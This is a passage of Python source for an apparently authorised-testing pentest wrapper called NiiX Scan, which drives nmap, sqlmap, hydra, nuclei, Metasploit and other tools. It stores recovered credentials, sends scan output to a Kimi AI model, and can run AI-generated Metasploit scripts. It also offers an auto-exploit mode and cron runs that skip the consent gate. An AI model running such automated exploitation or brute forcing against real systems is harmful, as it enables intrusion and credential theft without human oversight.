            cur = subprocess.run(["crontab","-l"], capture_output=True, text=True)
            existing = cur.stdout if cur.returncode == 0 else ""
            new = existing.rstrip("\n") + "\n" + entry + "\n"
            subprocess.run(["crontab","-"], input=new, text=True, check=True)
            msg_ok("Cron entry added. Note: scheduled runs reuse your saved API key, "
                   "settings and scope — and skip the interactive consent gate via "
                   "--i-have-permission.")
        except Exception as e:
            msg_err(f"Failed: {e}")
    elif ch == "3":
        try:
            cur = subprocess.run(["crontab","-l"], capture_output=True, text=True)
            keep = [l for l in cur.stdout.splitlines() if "niixscan-auto" not in l]
            subprocess.run(["crontab","-"], input="\n".join(keep) + "\n",
                           text=True, check=True)
            msg_ok("Removed.")
        except Exception as e:
            msg_err(f"Failed: {e}")
    pause()


# ══════════════════════════════════════════════════════════════════════════════
#  FINDINGS DB VIEWER + HTML REPORT
# ══════════════════════════════════════════════════════════════════════════════
def findings_viewer():
    banner()
    print(f"\n  {BL}{B}[ 🗄   FINDINGS DATABASE ]{R}  {DIM}{_DB}{R}\n")
    s = db_summary()
    print(f"  {B}{WH}Hosts ({len(s['hosts'])}){R}")
    for h, os_g, seen in s["hosts"][:20]:
        print(f"    {CY}●{R} {h:<32} {DIM}{os_g or ''}  last seen {seen}{R}")
    print(f"\n  {B}{WH}Vulnerabilities ({len(s['vulns'])}){R}")
    sc = {"critical":RD,"high":OR,"medium":YL,"low":GR,"info":DIM}
    for h, vid, sev, src in s["vulns"][:30]:
        print(f"    {sc.get(sev,DIM)}●{R} {h:<24} {vid:<28} {DIM}{sev} · {src}{R}")
    print(f"\n  {B}{WH}Credentials ({len(s['creds'])}){R}")
    for h, svc, u in s["creds"][:20]:
        print(f"    {GR}●{R} {h:<24} {svc:<10} {u}")
    print()
    if confirm("Delete ALL findings data"):
        _DB.unlink(missing_ok=True); msg_ok("Database deleted.")
    pause()

def generate_html_report(target: str) -> Path:
    """Standalone HTML report from the findings DB + AI analysis."""
    host = urlparse(target).hostname or target
    info = db_summary(host)
    analysis = SESSION.get("ai_report") or {}
    sc_col = {"critical":"#dc2626","high":"#ea580c","medium":"#ca8a04",
              "low":"#16a34a","info":"#6b7280"}
    def esc(s): return (str(s).replace("&","&amp;").replace("<","&lt;")
                        .replace(">","&gt;"))
    rows_ports = "".join(
        f"<tr><td>{p}</td><td>{pr}</td><td>{esc(s)}</td><td>{esc(v)}</td></tr>"
        for p, pr, s, v in info["ports"])
    rows_vulns = "".join(
        f"<tr><td>{esc(h)}</td><td>{esc(vid)}</td>"
        f"<td><span class='sev' style='background:{sc_col.get(sev,'#6b7280')}'>{esc(sev)}</span></td>"
        f"<td>{esc(src)}</td></tr>"
        for h, vid, sev, src in db_summary()["vulns"])
    rows_creds = "".join(
        f"<tr><td>{esc(svc)}</td><td>{esc(u)}</td><td><code>{esc(p)}</code></td></tr>"
        for svc, u, p, _src in info["creds"])
    ai_html = ""
    if analysis and "_raw" not in analysis:
        vulns_html = "".join(f"""
        <div class='vuln'>
          <h3>{esc(v.get('id','?'))} — {esc(v.get('title',''))}
            <span class='sev' style='background:{sc_col.get(v.get('severity','info'),'#6b7280')}'>
            {esc(v.get('severity','info'))}</span></h3>
          <p>{esc(v.get('description',''))}</p>
          <p class='ev'><b>Evidence:</b> {esc(v.get('evidence',''))}</p>
          {f"<p><b>MSF:</b> <code>{esc(v.get('msf_module'))}</code></p>" if v.get('msf_module') else ""}
        </div>""" for v in analysis.get("vulnerabilities", []))
        ai_html = f"""
        <h2>AI Analysis</h2>
        <p>{esc(analysis.get('summary',''))}</p>
        <h3>Attack path</h3><p>{esc(analysis.get('attack_path',''))}</p>
        {vulns_html}
        <h3>Remediation</h3><ul>{''.join(f'<li>{esc(r)}</li>' for r in analysis.get('remediation',[]))}</ul>"""
    html = f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
<title>NiiX Scan Report — {esc(host)}</title><style>
body{{font-family:system-ui,sans-serif;max-width:960px;margin:2rem auto;padding:0 1rem;color:#1f2937}}
h1{{border-bottom:3px solid #7c3aed;padding-bottom:.4rem}}
h2{{margin-top:2rem;color:#7c3aed}}
table{{border-collapse:collapse;width:100%;margin:1rem 0}}
td,th{{border:1px solid #d1d5db;padding:.45rem .7rem;text-align:left;font-size:.9rem}}
th{{background:#f3f4f6}}
.sev{{color:#fff;padding:.1rem .5rem;border-radius:.4rem;font-size:.78rem;text-transform:uppercase}}
.vuln{{border:1px solid #e5e7eb;border-left:4px solid #7c3aed;border-radius:.4rem;
padding:.6rem 1rem;margin:.8rem 0}}
.ev{{color:#6b7280;font-size:.88rem}}
code{{background:#f3f4f6;padding:.1rem .35rem;border-radius:.3rem}}
.meta{{color:#6b7280;font-size:.85rem}}
</style></head><body>
<h1>NiiX Scan — Pentest Report</h1>
<p class='meta'>Target: <b>{esc(host)}</b> · Generated {_now()} · Preset: {preset_name()}</p>
<h2>Open Ports ({len(info['ports'])})</h2>
<table><tr><th>Port</th><th>Proto</th><th>Service</th><th>Version</th></tr>{rows_ports}</table>
<h2>All Findings</h2>
<table><tr><th>Host</th><th>Finding</th><th>Severity</th><th>Source</th></tr>{rows_vulns}</table>
<h2>Recovered Credentials ({len(info['creds'])})</h2>
<table><tr><th>Service</th><th>Username</th><th>Password</th></tr>{rows_creds}</table>
{ai_html}
<p class='meta'>Generated by NiiX Scan — authorised testing only.</p>
</body></html>"""
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = Path(load_cfg().get("output_dir","~/niixscan-results")).expanduser()
    out_dir.mkdir(parents=True, exist_ok=True)
    p = out_dir / f"niix_report_{host}_{ts}.html"
    p.write_text(html)
    return p


# ══════════════════════════════════════════════════════════════════════════════
#  TOOL BASE CLASS
# ══════════════════════════════════════════════════════════════════════════════
class Tool:
    name = "tool"; label = "Generic Tool"; desc = "No description."; color = CY

    def install(self):
        """Default installer: try the distro package manager for the tool name.
        Subclasses override this when they need a custom install path."""
        _apt_update(); install_pkg(self.name)
        if not self.is_installed():
            raise RuntimeError(
                f"'{self.name}' not found after package install — "
                f"this tool needs a custom install() implementation.")
    def is_installed(self): return bool(shutil.which(self.name))
    def run_interactive(self): raise NotImplementedError
    def header(self):
        banner(); print(f"\n  {self.color}{B}[ {self.label} ]{R}\n")

    def _post_scan_ai(self, raw_output: str, target: str):
        """Offer AI analysis after a scan completes."""
        if not SESSION["api_key"]: return
        if not raw_output.strip(): return
        print(f"\n  {PU}»{R} Scan complete. {B}Analyse with Kimi?{R}")
        if confirm("Send results to Kimi AI for vulnerability analysis"):
            try:
                analysis = ai_analyse_scan(raw_output, self.label, target)
                SESSION["ai_report"] = analysis
                display_ai_analysis(analysis)
            except Exception as e:
                msg_err(f"AI analysis failed: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  TOOLS
# ══════════════════════════════════════════════════════════════════════════════

class NmapTool(Tool):
    name = "nmap"; label = "Nmap — Network Scanner"
    desc = "Port scanning, OS detection, service fingerprinting"; color = GR

    def install(self): _apt_update(); install_pkg("nmap")

    def run_interactive(self):
        self.header()
        target = ask("Target IP / hostname / CIDR", SESSION["target"] or "192.168.1.1")
        if not scope_guard(target): pause(); return
        SESSION["target"] = target
        profile = self._profile()
        xml = f"/tmp/niix_nmap_{int(time.time())}.xml"
        cmd = ["nmap", "-v", "--stats-every", "5s"] + profile + [target]
        rc, out = nmap_xml_scan(cmd, xml, f"Nmap → {target}", pct_fn=_pct_nmap,
                                capture_key="nmap")
        self._post_scan_ai(out, target); pause()

    def _profile(self):
        p = active_preset(); t = p["nmap_timing"]
        pr = {"1":(["-sV",t],"Quick service scan"),
              "2":(["-sV","-sC",t],"Default scripts + services"),
              "3":(["-p-","-sV",t],"Full port scan (all 65535)"),
              "4":(["-sU",t],"UDP scan"),
              "5":(["-A",t],"Aggressive (OS+version+scripts)"),
              "6":(["-sn"],"Ping sweep / host discovery")}
        print(f"\n  {WH}Scan profiles:{R}  {DIM}(timing {t} from '{preset_name()}' preset){R}")
        for k,(_,lbl) in pr.items(): print(f"    {CY}{k}{R}) {lbl}")
        flags = pr.get(ask("Profile","2"), pr["2"])[0]
        return p["nmap_evasion"] + flags


class SQLMapTool(Tool):
    name = "sqlmap"; label = "SQLMap — SQL Injection Scanner"
    desc = "Automatic SQL injection detection & exploitation"; color = RD

    def install(self):
        dest = Path("/opt/sqlmap"); ensure_base()
        if dest.exists():
            msg_inf("SQLMap present. Pulling updates …")
            _run(["sudo","git","-C",str(dest),"pull"], check=False,
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            _run(["sudo","git","clone","--depth=1",
                  "https://github.com/sqlmapproject/sqlmap.git", str(dest)], check=True)
        _run(["sudo","chmod","755", str(dest/"sqlmap.py")], check=False)
        _run(["sudo","chown","-R", f"{os.environ.get('USER','root')}:", str(dest)], check=False)
        msg_ok("SQLMap installed at /opt/sqlmap")

    def is_installed(self): return Path("/opt/sqlmap/sqlmap.py").exists()

    def run_interactive(self):
        self.header()
        url = ask("Target URL (e.g. https://site.com/page?id=1)", "")
        if not validate_url(url): msg_err("Invalid URL."); pause(); return
        if not scope_guard(url): pause(); return
        SESSION["target"] = urlparse(url).netloc
        extras = ask("Extra flags (e.g. --level=3 --risk=2)", "")
        cmd = [sys.executable, "/opt/sqlmap/sqlmap.py",
               "-u", url, "--batch", "--output-dir=/tmp/sqlmap_out"]
        if extras: cmd += extras.split()
        rc, out = run_scan(cmd, f"SQLMap → {url}", pct_fn=_pct_sqlmap,
                           capture_key="sqlmap")
        self._post_scan_ai(out, url); pause()


class NucleiTool(Tool):
    name = "nuclei"; label = "Nuclei — Vulnerability Scanner"
    desc = "Template-based fast vulnerability scanner"; color = MG

    def install(self):
        ensure_base()
        install_github_binary("projectdiscovery/nuclei",
            r"^nuclei_[\d.]+_linux_{arch}\.zip$", "nuclei")
        msg_inf("Downloading Nuclei templates …")
        spinner_start("Fetching templates …")
        try:
            r = subprocess.run(["nuclei","-update-templates"],
                               capture_output=True, text=True, timeout=180, check=False)
            if r.returncode != 0:
                spinner_stop("Template update failed.")
                msg_wrn(f"nuclei -update-templates exited {r.returncode}: "
                        f"{(r.stderr or r.stdout).strip()[:160]}")
                msg_inf("Templates can be updated later with: nuclei -update-templates")
            else:
                spinner_stop("Templates ready.")
        except subprocess.TimeoutExpired:
            spinner_stop("Template update timed out.")
            msg_wrn("Nuclei template download exceeded 180s — retry later with: nuclei -update-templates")
        except Exception as e:
            spinner_stop("Template update failed.")
            msg_wrn(f"{e} — retry later with: nuclei -update-templates")

    def run_interactive(self):
        self.header()
        target = ask("Target URL or IP", SESSION["target"] or "")
        if not target: msg_err("No target."); pause(); return
        if not scope_guard(target): pause(); return
        SESSION["target"] = target
        severity = ask("Severity filter", "critical,high")
        jsonl = f"/tmp/niix_nuclei_{int(time.time())}.jsonl"
        cmd = ["nuclei","-u",target,"-severity",severity,"-stats","-stats-interval","2",
               "-jsonl","-o",jsonl]
        rc, out = run_scan(cmd, f"Nuclei → {target}", pct_fn=_pct_nuclei,
                           capture_key="nuclei")
        if Path(jsonl).exists():
            for line in Path(jsonl).read_text(errors="replace").splitlines():
                parse_nuclei_line(line, target)
        self._post_scan_ai(out, target); pause()


class NiktoTool(Tool):
    name = "nikto"; label = "Nikto — Web Server Scanner"
    desc = "Web server misconfiguration & vulnerability checks"; color = YL

    def install(self): _apt_update(); install_pkg("nikto")

    def run_interactive(self):
        self.header()
        host = ask("Target host/URL", SESSION["target"] or "https://example.com")
        if not scope_guard(host): pause(); return
        SESSION["target"] = host
        output = ask("Save report to file (blank to skip)", "")
        cmd = ["nikto","-h",host]
        if output: cmd += ["-output",output]
        rc, out = run_scan(cmd, f"Nikto → {host}", pct_fn=_pct_nikto,
                           capture_key="nikto")
        self._post_scan_ai(out, host); pause()


class HydraTool(Tool):
    name = "hydra"; label = "Hydra — Brute-Force Tool"
    desc = "Network login cracker (SSH, FTP, HTTP, etc.)"; color = RD

    def install(self): _apt_update(); install_pkg("hydra")

    def run_interactive(self):
        self.header()
        msg_wrn("Only use against systems you own or have explicit permission.")
        if not confirm("I understand and have permission"): return
        target   = ask("Target IP / hostname", SESSION["target"] or "")
        service  = ask("Service (ssh/ftp/http-post-form/…)", "ssh")
        userlist = ask("Userlist file", "/usr/share/wordlists/metasploit/unix_users.txt")
        passlist = ask("Passlist file", "/usr/share/wordlists/rockyou.txt")
        threads  = ask("Threads", active_preset()["hydra_threads"])
        userlist = _check_wordlist(userlist); passlist = _check_wordlist(passlist)
        if not userlist or not passlist: pause(); return
        if not target: msg_err("No target."); pause(); return
        if not scope_guard(target): pause(); return
        cmd = maybe_proxy(["hydra","-L",userlist,"-P",passlist,"-t",threads,"-V",target,service])
        rc, out = run_scan(cmd, f"Hydra → {target} ({service})", pct_fn=_pct_hydra,
                           capture_key="hydra")
        parse_hydra_creds(out)
        self._post_scan_ai(out, target); pause()


class GobusterTool(Tool):
    name = "gobuster"; label = "Gobuster — Directory/DNS Brute-Forcer"
    desc = "Enumerate web directories, DNS subdomains & vhosts"; color = BL

    def install(self):
        _apt_update(); install_pkg("gobuster")
        if not shutil.which("gobuster"):
            install_github_binary("OJ/gobuster",
                r"gobuster_Linux_(x86_64|{arch})\.tar\.gz", "gobuster")

    def run_interactive(self):
        self.header()
        mode = ask("Mode: dir / dns / vhost","dir")
        url  = ask("Target URL (dir/vhost) or domain (dns)", SESSION["target"] or "")
        if not url: msg_err("No target."); pause(); return
        if not scope_guard(url): pause(); return
        wl   = ask("Wordlist", _smart_wordlist(url))
        wl = _check_wordlist(wl)
        if not wl: pause(); return
        extras = ask("Extra flags","")
        p = active_preset()
        common = ["-w", wl, "--no-color", "-t", p["gobuster_threads"]]
        if p["gobuster_delay"]: common += ["--delay", p["gobuster_delay"]]
        if   mode=="dir":   cmd = ["gobuster","dir", "-u",url] + common
        elif mode=="dns":   cmd = ["gobuster","dns", "-d",url] + common
        elif mode=="vhost": cmd = ["gobuster","vhost","-u",url] + common
        else:
            msg_err(f"Unknown mode: {mode}"); pause(); return
        if extras: cmd += extras.split()
        cmd = maybe_proxy(cmd)
        rc, out = run_scan(cmd, f"Gobuster {mode} → {url}", pct_fn=_pct_gobuster,
                           capture_key="gobuster")
        self._post_scan_ai(out, url); pause()


class MasscanTool(Tool):
    name = "masscan"; label = "Masscan — Ultra-Fast Port Scanner"
    desc = "Internet-speed port scanner"; color = MG

    def install(self): _apt_update(); install_pkg("masscan")

    def run_interactive(self):
        self.header()
        target = ask("Target IP / CIDR", SESSION["target"] or "192.168.1.0/24")
        if not scope_guard(target): pause(); return
        ports  = ask("Port range","1-65535"); rate = ask("Packets/sec", active_preset()["masscan_rate"])
        cmd = ["sudo","masscan",target,f"-p{ports}",f"--rate={rate}"]
        rc, out = run_scan(cmd, f"Masscan → {target}:{ports}", pct_fn=_pct_masscan,
                           capture_key="masscan")
        self._post_scan_ai(out, target); pause()


class SubfinderTool(Tool):
    name = "subfinder"; label = "Subfinder — Subdomain Enumeration"
    desc = "Passive subdomain discovery"; color = CY

    def install(self):
        ensure_base()
        install_github_binary("projectdiscovery/subfinder",
            r"^subfinder_[\d.]*_?linux_{arch}\.zip$", "subfinder")

    def run_interactive(self):
        self.header()
        domain = ask("Target domain", SESSION["target"] or "example.com")
        if not scope_guard(domain): pause(); return
        output = ask("Output file (blank to skip)","")
        cmd = ["subfinder","-d",domain,"-v"]
        if output: cmd += ["-o",output]
        rc, out = run_scan(cmd, f"Subfinder → {domain}", total_lines=300,
                           capture_key="subfinder")
        self._post_scan_ai(out, domain); pause()


class ReconTool(Tool):
    name = "whois"; label = "Recon — WHOIS / DNS / Traceroute"
    desc = "Passive information gathering"; color = WH

    def install(self): _apt_update(); install_pkg("whois","dnsutils","traceroute")

    def run_interactive(self):
        self.header()
        ops = {"1":"WHOIS lookup","2":"DNS lookup (A/MX/NS)",
               "3":"Reverse DNS","4":"Traceroute"}
        for k,lbl in ops.items(): print(f"    {CY}{k}{R}) {lbl}")
        choice = ask("Operation","1")
        target = ask("Target IP / domain", SESSION["target"] or "")
        if not target: msg_err("No target."); pause(); return
        if not scope_guard(target): pause(); return
        print(hline())
        out = ""
        if choice=="1":
            r = subprocess.run(["whois",target], capture_output=True, text=True)
            out = r.stdout; print(out)
        elif choice=="2":
            parts = []
            for rtype in ("A", "MX", "NS"):
                r = subprocess.run(["dig", "+short", target, rtype],
                                   capture_output=True, text=True)
                parts.append(f";; {rtype}\n{r.stdout.strip()}")
            out = "\n".join(parts); print(out)
        elif choice=="3":
            r = subprocess.run(["host",target], capture_output=True, text=True)
            out = r.stdout; print(out)
        elif choice=="4":
            _run(["traceroute",target])
        print(hline())
        if out: SESSION["scan_results"]["recon"] = SESSION["scan_results"].get("recon","") + out
        self._post_scan_ai(out, target); pause()


class HttpxTool(Tool):
    name = "httpx"; label = "httpx — Live Web Host Prober"
    desc = "Probe hosts for live HTTP/S services, titles & tech stack"; color = GR

    def install(self):
        ensure_base()
        install_github_binary("projectdiscovery/httpx",
            r"^httpx_[\d.]+_linux_{arch}\.zip$", "httpx")

    def run_interactive(self):
        self.header()
        target = ask("Target host / domain / file with hosts", SESSION["target"] or "")
        if not target: msg_err("No target."); pause(); return
        if not scope_guard(target): pause(); return
        if Path(target).is_file():
            cmd = ["httpx","-l",target,"-title","-tech-detect","-status-code","-silent"]
        else:
            cmd = ["httpx","-u",target,"-title","-tech-detect","-status-code","-silent"]
        rc, out = run_scan(cmd, f"httpx → {target}", capture_key="httpx")
        # Feed live web services into the findings DB
        for line in out.splitlines():
            m = re.match(r"(https?://\S+)", line.strip())
            if m:
                h = urlparse(m.group(1)).hostname
                if h: db_add_host(h)
        self._post_scan_ai(out, target); pause()


class FfufTool(Tool):
    name = "ffuf"; label = "ffuf — Web Fuzzer"
    desc = "Fast web content / parameter fuzzing"; color = OR

    def install(self):
        ensure_base()
        install_github_binary("ffuf/ffuf",
            r"^ffuf_[\d.]+_linux_{arch}\.tar\.gz$", "ffuf")

    def run_interactive(self):
        self.header()
        url = ask("Target URL with FUZZ keyword (e.g. https://site.com/FUZZ)",
                  SESSION["target"] or "")
        if "FUZZ" not in url: msg_err("URL must contain the FUZZ keyword."); pause(); return
        if not scope_guard(url): pause(); return
        wl = _check_wordlist(ask("Wordlist", _smart_wordlist(url)))
        if not wl: pause(); return
        p = active_preset()
        cmd = ["ffuf","-u",url,"-w",wl,"-t",p["gobuster_threads"],"-mc","200,204,301,302,307,401,403","-noninteractive"]
        extras = ask("Extra flags (e.g. -fs 1234)", "")
        if extras: cmd += extras.split()
        rc, out = run_scan(maybe_proxy(cmd), f"ffuf → {url}", capture_key="ffuf")
        self._post_scan_ai(out, url); pause()


class Enum4linuxTool(Tool):
    name = "enum4linux-ng"; label = "enum4linux-ng — SMB/Windows Enum"
    desc = "Enumerate SMB shares, users & policies (internal/AD)"; color = BL

    def install(self): _apt_update(); install_pkg("enum4linux-ng")
    def is_installed(self): return bool(shutil.which("enum4linux-ng") or shutil.which("enum4linux"))

    def run_interactive(self):
        self.header()
        target = ask("Target IP / hostname", SESSION["target"] or "")
        if not target: msg_err("No target."); pause(); return
        if not scope_guard(target): pause(); return
        bin_ = shutil.which("enum4linux-ng") or "enum4linux"
        # Offer cracked credentials if we have any for this host
        creds = db_creds_for(target)
        cmd = [bin_, "-A", target]
        if creds:
            msg_inf(f"Found {len(creds)} stored credential set(s) for {target}.")
            if confirm("Use the first one for authenticated enumeration"):
                svc, u, pw = creds[0]
                cmd += ["-u", u, "-p", pw]
        rc, out = run_scan(cmd, f"enum4linux → {target}", capture_key="enum4linux")
        self._post_scan_ai(out, target); pause()


class TestsslTool(Tool):
    name = "testssl.sh"; label = "testssl.sh — TLS/SSL Audit"
    desc = "TLS configuration, cipher & certificate vulnerabilities"; color = YL

    def install(self):
        _apt_update()
        install_pkg("testssl.sh")
        if not self.is_installed():
            install_pkg("testssl")

    def is_installed(self):
        return bool(shutil.which("testssl.sh") or shutil.which("testssl"))

    def run_interactive(self):
        self.header()
        target = ask("Target host[:port]", SESSION["target"] or "")
        if not target: msg_err("No target."); pause(); return
        if not scope_guard(target): pause(); return
        bin_ = shutil.which("testssl.sh") or "testssl"
        cmd = [bin_, "--color", "0", target]
        rc, out = run_scan(cmd, f"testssl → {target}", capture_key="testssl")
        for m in re.finditer(r"(CVE-\d{4}-\d{4,7})", out):
            db_add_vuln(target, m.group(1), m.group(1), "medium", "testssl")
        self._post_scan_ai(out, target); pause()


class MetasploitTool(Tool):
    name = "msfconsole"; label = "Metasploit — Exploitation Framework"
    desc = "Vulnerability exploitation & post-exploitation"; color = RD

    def install(self): install_metasploit()

    def run_interactive(self):
        self.header()
        msg_wrn("Only use against systems you own or have explicit permission.")
        if not confirm("I understand and have permission"): return

        print(f"\n  {CY}1{R}) ▶  Open msfconsole (interactive)")
        print(f"  {CY}2{R}) 📄  Run a saved .rc resource script")
        print(f"  {CY}3{R}) 🤖  AI → Generate & run .rc from last analysis")
        print(f"  {CY}0{R}) ←  Back\n")
        ch = input(f"  {CY}»{R} ").strip()
        if ch == "1":
            _run(["msfconsole"])
        elif ch == "2":
            rc_path = ask("Path to .rc file", "")
            if rc_path and Path(rc_path).exists():
                run_rc_script(rc_path)
            else:
                msg_err("File not found.")
            pause()
        elif ch == "3":
            if not SESSION.get("ai_report"):
                msg_err("No AI analysis yet. Run a scan + AI analysis first.")
                pause(); return
            msf_pipeline(SESSION["target"] or "unknown", SESSION["ai_report"])

# ══════════════════════════════════════════════════════════════════════════════
#  TOOL REGISTRY
# ══════════════════════════════════════════════════════════════════════════════
TOOLS = [
    NmapTool(), SQLMapTool(), NucleiTool(), NiktoTool(),
    HydraTool(), GobusterTool(), MasscanTool(), SubfinderTool(),
    ReconTool(), MetasploitTool(),
    HttpxTool(), FfufTool(), Enum4linuxTool(), TestsslTool(),
]

# ══════════════════════════════════════════════════════════════════════════════
#  INSTALL HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def install_single(tool):
    banner(); print(f"\n  {YL}{B}Installing {tool.label} …{R}\n")
    ensure_base()
    try:
        tool.install()
        if tool.is_installed():
            ver = tool_versions().get(tool.name.replace("msfconsole","msfconsole"), "")
            msg_ok(f"{tool.label} installed and verified.  {DIM}{ver}{R}")
        else:
            msg_err(f"{tool.label} — install finished but binary not found in PATH.")
    except Exception as e:
        msg_err(f"Install failed: {e}")
    pause()

def install_all():
    banner(); print(f"\n  {YL}{B}Installing all tools …{R}\n")
    ensure_base()
    total = len(TOOLS); bar_w = min(44, _W()-30)
    for idx, tool in enumerate(TOOLS, 1):
        _draw_bar(int((idx-1)*100/total), f"({idx}/{total}) {tool.label}", bar_w)
        try: tool.install()
        except Exception as e: print(); msg_err(f"{tool.label}: {e}")
    _draw_bar(100, "All tools processed ✔", bar_w); print()
    msg_ok("Installation complete."); pause()

# ══════════════════════════════════════════════════════════════════════════════
#  SETTINGS
# ══════════════════════════════════════════════════════════════════════════════
_CFG = Path.home() / ".config" / "niixscan" / "config.json"

def load_cfg():
    if _CFG.exists():
        try:
            return json.loads(_CFG.read_text())
        except (json.JSONDecodeError, OSError) as e:
            # Back up the broken config instead of silently discarding it
            try:
                bak = _CFG.with_suffix(".corrupt.bak")
                shutil.copy2(_CFG, bak)
                msg_wrn(f"Config file unreadable ({e}) — backed up to {bak}, starting fresh.")
            except OSError:
                msg_wrn(f"Config file unreadable ({e}) — starting with defaults.")
    return {}

def save_cfg(c):
    _CFG.parent.mkdir(parents=True, exist_ok=True)
    _CFG.write_text(json.dumps(c, indent=2))
    try: os.chmod(_CFG, 0o600)   # config holds the API key — owner-only
    except OSError: pass

def settings_menu():
    cfg = load_cfg()
    # Load saved API key into session
    if cfg.get("api_key") and not SESSION["api_key"]:
        SESSION["api_key"] = cfg["api_key"]

    while True:
        banner()
        print(f"\n  {MG}{B}⚙  Settings{R}\n")
        key_display = ("*"*8 + SESSION["api_key"][-4:]) if len(SESSION["api_key"]) > 8 else (SESSION["api_key"] or "not set")
        print(f"  {CY}1{R}) Kimi API Key       : {GR if SESSION['api_key'] else RD}{key_display}{R}")
        print(f"  {CY}2{R}) Output directory   : {cfg.get('output_dir','~/niixscan-results')}")
        print(f"  {CY}3{R}) Default wordlist    : {cfg.get('wordlist','/usr/share/wordlists/rockyou.txt')}")
        print(f"  {CY}4{R}) Kimi model          : {cfg.get('model', KIMI_MODEL)}")
        print(f"  {CY}5{R}) API endpoint        : {cfg.get('api_base', KIMI_API_DEFAULT)}")
        print(f"  {CY}6{R}) Test API connection")
        print(f"  {CY}7{R}) Scan intensity      : {cfg.get('preset','normal')}  {DIM}(stealth/normal/aggressive){R}")
        print(f"  {CY}8{R}) Scan timeout        : {cfg.get('scan_timeout','0')}s  {DIM}(0 = no limit){R}")
        print(f"  {CY}9{R}) Proxychains         : {'ON' if cfg.get('proxychains') else 'off'}")
        print(f"  {CY}W{R}) Webhook URL        : {(cfg.get('webhook_url') or 'not set')[:50]}")
        print(f"  {CY}E{R}) Edit scope file     : {_SCOPE_FILE}")
        print(f"  {RD}X{R}) Auto-exploit        : {RD if cfg.get('auto_exploit') else DIM}"
              f"{'ON' if cfg.get('auto_exploit') else 'off'}{R}  "
              f"{DIM}(severity ≥ {cfg.get('auto_exploit_severity','critical')}, verified modules only){R}")
        print(f"  {CY}0{R}) Back\n")
        print(f"  {DIM}Get a key at https://platform.kimi.ai → API Keys (top up ≥ $1 to unlock).{R}\n")
        ch = input(f"  {CY}»{R} ").strip()

        if ch == "1":
            import getpass
            try:
                key = getpass.getpass(f"  {CY}?{R} Paste Kimi API key (hidden): ").strip()
            except (EOFError, KeyboardInterrupt):
                key = ""
            if key:
                SESSION["api_key"] = key; cfg["api_key"] = key
                save_cfg(cfg); msg_ok("API key saved.")
            else:
                msg_wrn("No key entered — unchanged.")
        elif ch == "2":
            cfg["output_dir"] = ask("Output dir", cfg.get("output_dir","~/niixscan-results"))
            save_cfg(cfg); msg_ok("Saved.")
        elif ch == "3":
            cfg["wordlist"] = ask("Wordlist", cfg.get("wordlist","/usr/share/wordlists/rockyou.txt"))
            save_cfg(cfg); msg_ok("Saved.")
        elif ch == "4":
            cfg["model"] = ask("Model (kimi-k2.6, kimi-k2.7-code, kimi-k3)", cfg.get("model", KIMI_MODEL))
            save_cfg(cfg); msg_ok("Saved.")
        elif ch == "5":
            ep = ask("Endpoint (api.moonshot.ai intl / api.moonshot.cn China)",
                     cfg.get("api_base", KIMI_API_DEFAULT))
            ep = ep.rstrip("/")
            if not ep.startswith(("http://", "https://")):
                ep = "https://" + ep
            if not ep.endswith("/chat/completions"):
                ep += "/v1/chat/completions" if not ep.endswith("/v1") else "/chat/completions"
            cfg["api_base"] = ep
            save_cfg(cfg); msg_ok(f"Saved → {ep}")
        elif ch == "6":
            if not SESSION["api_key"]:
                msg_err("No API key set."); time.sleep(1); continue
            spinner_start("Testing connection …")
            try:
                resp = _kimi_request("You are a test assistant.",
                                       "Reply with only: OK", max_tokens=10)
                spinner_stop(f"Connection OK — model replied: {resp.strip()}")
            except Exception as e:
                spinner_stop(f"Failed: {e}")
            pause()
        elif ch == "7":
            p = ask("Preset (stealth / normal / aggressive)", cfg.get("preset","normal")).lower()
            if p in PRESETS:
                cfg["preset"] = p; save_cfg(cfg); msg_ok(f"Preset: {p}")
            else:
                msg_err("Unknown preset.")
        elif ch == "8":
            cfg["scan_timeout"] = ask("Max seconds per scan (0 = unlimited)",
                                      cfg.get("scan_timeout","0"))
            save_cfg(cfg); msg_ok("Saved.")
        elif ch == "9":
            if not (shutil.which("proxychains4") or shutil.which("proxychains")):
                msg_wrn("proxychains not installed — installing …")
                install_pkg("proxychains4")
                if not (shutil.which("proxychains4") or shutil.which("proxychains")):
                    install_pkg("proxychains")
            cfg["proxychains"] = not cfg.get("proxychains", False)
            save_cfg(cfg)
            msg_ok(f"Proxychains {'ENABLED — scans will route via proxy' if cfg['proxychains'] else 'disabled'}.")
        elif ch == "w":
            cfg["webhook_url"] = ask("Webhook URL (Discord/Slack/generic POST endpoint; blank = off)",
                                     cfg.get("webhook_url", ""))
            save_cfg(cfg); msg_ok("Saved.")
            if cfg["webhook_url"]:
                notify("NiiX Scan webhook test ✔")
        elif ch == "x":
            if not cfg.get("auto_exploit"):
                print(f"\n  {RD}{B}⚠ AUTO-EXPLOIT runs real exploits without per-exploit prompts.{R}")
                print(f"  It only fires on: authorized + in-scope targets, modules verified")
                print(f"  against your local Metasploit, at/above your severity threshold.")
                if not confirm("Enable auto-exploitation"):
                    continue
                cfg["auto_exploit"] = True
                sev = ask("Severity threshold (critical / high / medium)",
                          cfg.get("auto_exploit_severity", "critical")).lower()
                if sev in ("critical", "high", "medium"):
                    cfg["auto_exploit_severity"] = sev
                save_cfg(cfg); msg_ok(f"Auto-exploit ON (≥ {cfg['auto_exploit_severity']}).")
            else:
                cfg["auto_exploit"] = False
                save_cfg(cfg); msg_ok("Auto-exploit disabled.")
        elif ch == "e":
            _SCOPE_FILE.parent.mkdir(parents=True, exist_ok=True)
            if not _SCOPE_FILE.exists():
                _SCOPE_FILE.write_text(
                    "# NiiX Scan scope — one entry per line\n"
                    "# In-scope: 192.168.1.0/24, 10.0.0.5, example.com\n"
                    "# Exclusions: prefix with !  e.g. !192.168.1.1\n"
                    "# Empty file = scope check disabled\n")
            editor = os.environ.get("EDITOR", "nano")
            _run([editor, str(_SCOPE_FILE)])
            inc, exc = load_scope()
            msg_ok(f"Scope: {len(inc)} include(s), {len(exc)} exclusion(s).")
        elif ch == "0":
            break
        time.sleep(0.3)

# ══════════════════════════════════════════════════════════════════════════════
#  CONSENT GATE
# ══════════════════════════════════════════════════════════════════════════════
def authorization_gate():
    """Single session consent prompt. Must pass before any scanning."""
    if SESSION["authorized"]: return True
    banner()
    w = _W()
